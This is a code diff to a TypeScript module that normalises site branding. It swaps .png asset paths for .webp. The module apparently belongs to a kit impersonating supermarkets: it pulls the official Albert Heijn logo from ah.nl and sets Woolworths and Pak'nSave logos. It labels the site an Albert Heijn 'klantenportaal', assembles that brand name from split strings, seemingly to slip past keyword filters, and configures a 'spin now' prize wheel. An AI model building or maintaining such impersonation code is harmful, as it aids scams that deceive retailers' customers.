@@ -60,22 +60,22 @@ type LegacyGlobalSettings = Partial<GlobalSettings> & {
 
 const LEGACY_ALBERT_HEIJN_LOGO_URL = "https://static.ah.nl/ah-static/images/ah-ui-bridge-components/logo/logo-ah.svg";
 const LEGACY_PAKNSAVE_LOGO_URLS = new Set([
-  "/wheel-assets/desktop/png/paknsave-logo-hub.png",
-  "/form-assets/paknsave-logo-form.png",
-  "/wheel-assets/mobile/png/paknsave-logo-hub.png",
-  "/form-assets/maxima-mini-logo.png",
+  "/wheel-assets/desktop/png/paknsave-logo-hub.webp",
+  "/form-assets/paknsave-logo-form.webp",
+  "/wheel-assets/mobile/png/paknsave-logo-hub.webp",
+  "/form-assets/maxima-mini-logo.webp",
 ]);
-const DEFAULT_AU_LOGO_URL = "/woolworths/transparent/woolworths-logo-official-transparent.png";
-const AUSTRALIA_BG_URL = "/woolworths/portal/desktop-background-clean.png";
-const AUSTRALIA_BG_URL_MOBILE = "/woolworths/portal/mobile-background-clean.png";
-const AUSTRALIA_FORM_LOGO = "/woolworths/transparent/woolworths-logo-form-512x512.png";
-const LEGACY_BG_URL = "/spar-bg.png";
+const DEFAULT_AU_LOGO_URL = "/woolworths/transparent/woolworths-logo-official-transparent.webp";
+const AUSTRALIA_BG_URL = "/woolworths/portal/desktop-background-clean.webp";
+const AUSTRALIA_BG_URL_MOBILE = "/woolworths/portal/mobile-background-clean.webp";
+const AUSTRALIA_FORM_LOGO = "/woolworths/transparent/woolworths-logo-form-512x512.webp";
+const LEGACY_BG_URL = "/spar-bg.webp";
 const LEGACY_WHEEL_BACKGROUNDS = new Set([
-  "/wheel-assets/desktop/background-opaque.png",
-  "/wheel-assets/mobile/background-opaque.png",
-  "/wheel-assets/bg-1.png",
-  "/wheel-assets/mobile-bg.png",
-  "/wheel-assets/cark-bg.png",
+  "/wheel-assets/desktop/background-opaque.webp",
+  "/wheel-assets/mobile/background-opaque.webp",
+  "/wheel-assets/bg-1.webp",
+  "/wheel-assets/mobile-bg.webp",
+  "/wheel-assets/cark-bg.webp",
 ]);
 const LEGACY_BRAND_NAME = ["Albert", "Heijn"].join(" ");
 const LEGACY_PORTAL_NAME = `${LEGACY_BRAND_NAME} klantenportaal`;
@@ -157,7 +157,7 @@ function normalizeBranding(settings: LegacyGlobalSettings): Partial<GlobalSettin
 
   if (
     !next.logo_url ||
-    next.logo_url === "/logo.png" ||
+    next.logo_url === "/logo.webp" ||
     next.logo_url === LEGACY_ALBERT_HEIJN_LOGO_URL ||
     LEGACY_PAKNSAVE_LOGO_URLS.has(next.logo_url)
   ) {
@@ -220,34 +220,34 @@ function normalizeBranding(settings: LegacyGlobalSettings): Partial<GlobalSettin
     nextWheelSettings.bg_url_mobile = AUSTRALIA_BG_URL_MOBILE;
     nextWheelSettings.page_backgrounds = {};
     if (!nextWheelSettings.desktop_background || LEGACY_WHEEL_BACKGROUNDS.has(nextWheelSettings.desktop_background)) {
-      nextWheelSettings.desktop_background = "/wheel-assets/desktop/background-opaque.png";
+      nextWheelSettings.desktop_background = "/wheel-assets/desktop/background-opaque.webp";
     }
     if (!nextWheelSettings.mobile_background || LEGACY_WHEEL_BACKGROUNDS.has(nextWheelSettings.mobile_background)) {
-      nextWheelSettings.mobile_background = "/wheel-assets/mobile/background-opaque.png";
+      nextWheelSettings.mobile_background = "/wheel-assets/mobile/background-opaque.webp";
     }
     if (!nextWheelSettings.desktop_hub || LEGACY_PAKNSAVE_LOGO_URLS.has(nextWheelSettings.desktop_hub)) {
-      nextWheelSettings.desktop_hub = "/wheel-assets/desktop/png/woolworths-logo-hub.png";
+      nextWheelSettings.desktop_hub = "/wheel-assets/desktop/png/woolworths-logo-hub.webp";
     }
     if (!nextWheelSettings.mobile_hub || LEGACY_PAKNSAVE_LOGO_URLS.has(nextWheelSettings.mobile_hub)) {
-      nextWheelSettings.mobile_hub = "/wheel-assets/mobile/png/woolworths-logo-hub.png";
+      nextWheelSettings.mobile_hub = "/wheel-assets/mobile/png/woolworths-logo-hub.webp";
     }
     if (!nextWheelSettings.desktop_wheel) {
-      nextWheelSettings.desktop_wheel = "/wheel-assets/desktop/png/wheel-with-aud-labels.png";
+      nextWheelSettings.desktop_wheel = "/wheel-assets/desktop/png/wheel-with-aud-labels.webp";
     }
     if (!nextWheelSettings.mobile_wheel) {
-      nextWheelSettings.mobile_wheel = "/wheel-assets/mobile/png/wheel-with-aud-labels.png";
+      nextWheelSettings.mobile_wheel = "/wheel-assets/mobile/png/wheel-with-aud-labels.webp";
     }
     if (!nextWheelSettings.desktop_pointer) {
-      nextWheelSettings.desktop_pointer = "/wheel-assets/desktop/png/pointer.png";
+      nextWheelSettings.desktop_pointer = "/wheel-assets/desktop/png/pointer.webp";
     }
     if (!nextWheelSettings.mobile_pointer) {
-      nextWheelSettings.mobile_pointer = "/wheel-assets/mobile/png/pointer.png";
+      nextWheelSettings.mobile_pointer = "/wheel-assets/mobile/png/pointer.webp";
     }
     if (!nextWheelSettings.desktop_button) {
-      nextWheelSettings.desktop_button = "/wheel-assets/desktop/png/spin-now-button.png";
+      nextWheelSettings.desktop_button = "/wheel-assets/desktop/png/spin-now-button.webp";
     }
     if (!nextWheelSettings.mobile_button) {
-      nextWheelSettings.mobile_button = "/wheel-assets/mobile/png/spin-now-button.png";
+      nextWheelSettings.mobile_button = "/wheel-assets/mobile/png/spin-now-button.webp";
     }
     next.wheel_settings = nextWheelSettings;
 
